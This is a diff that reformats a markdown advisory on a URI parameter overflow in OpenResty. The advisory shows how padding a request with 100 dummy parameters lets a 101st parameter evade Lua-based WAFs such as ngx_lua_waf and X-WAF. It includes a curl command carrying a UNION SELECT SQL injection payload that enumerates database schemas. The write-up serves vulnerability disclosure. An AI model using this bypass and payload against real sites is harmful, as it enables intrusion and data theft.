@@ -1,4 +1,4 @@
-#Uri parameter overflow in OpenResty
+# Uri parameter overflow in OpenResty
 
 ### General Description	
 
@@ -10,7 +10,8 @@ First look at the official API document. There are two ways to get a URI: ngx.re
 
 Test case：
 
-`server {
+```
+server {
    listen    80;
    server_name  localhost;
 
@@ -20,18 +21,16 @@ Test case：
            for k,v in pairs(arg) do
                ngx.say("[GET ] key:", k, " v:", v)
            end
-
-```
        ngx.req.read_body()
        local arg = ngx.req.get_post_args()
        for k,v in pairs(arg) do
            ngx.say("[POST] key:", k, " v:", v)
        end
    }
-```
 
    }
-}`
+}
+```
 
 When the same parameter ID is submitted, it is sorted according to the order of received parameters.
 
@@ -39,12 +38,13 @@ However, when the parameter ID is used to transform the case, such as Id, iD and
 
 ![](2.png)
 
-####Uri parameter overflow
+#### Uri parameter overflow
 
 What happens if we do not have a segment parameter, so I construct a test case that is convenient for display, a0-a9, 10*10, a total of 100 parameters, and then add the 101st parameters to the SQL injection Payload, let's see what happens?
 
 Test cases:
 
+```
  curl '127.0.0.1/test?
  a0=0&a0=0&a0=0&a0=0&a0=0&a0=0&a0=0&a0=0&a0=0&a0=0&
  a1=1&a1=1&a1=1&a1=1&a1=1&a1=1&a1=1&a1=1&a1=1&a1=1&
@@ -57,6 +57,7 @@ Test cases:
  a8=8&a8=8&a8=8&a8=8&a8=8&a8=8&a8=8&a8=8&a8=8&a8=8&
  a9=9&a9=9&a9=9&a9=9&a9=9&a9=9&a9=9&a9=9&a9=9&a9=9&
  id=1 union select 1,schema_name,3 from INFORMATION_SCHEMA.schemata'
+```
 
 Output results:
 
@@ -76,7 +77,7 @@ Based on the security protection of the ngx_lua development, it is impossible fo
 
 ### Impact products
 
-####A、ngx_lua_waf
+#### A ngx_lua_waf
 
 Ngx_lua_waf is a web application firewall based on lua-nginx-module (openresty).
 
@@ -92,9 +93,7 @@ github：https://github.com/loveshell/ngx_lua_waf
 
 ![](6.png)
 
-
-
-####B、X-WAF
+#### B X-WAF
 
 X-WAF is a cloud WAF system suitable for small and medium-sized businesses, enabling small and medium-sized businesses to have their own free cloud WAF conveniently.
 
@@ -108,10 +107,6 @@ github：https://github.com/xsec-lab/x-waf
 
 ![](7.png)
 
-
-
 **Using uri parameter overflow Bypass：**
 
 ![](8.png)
-
-
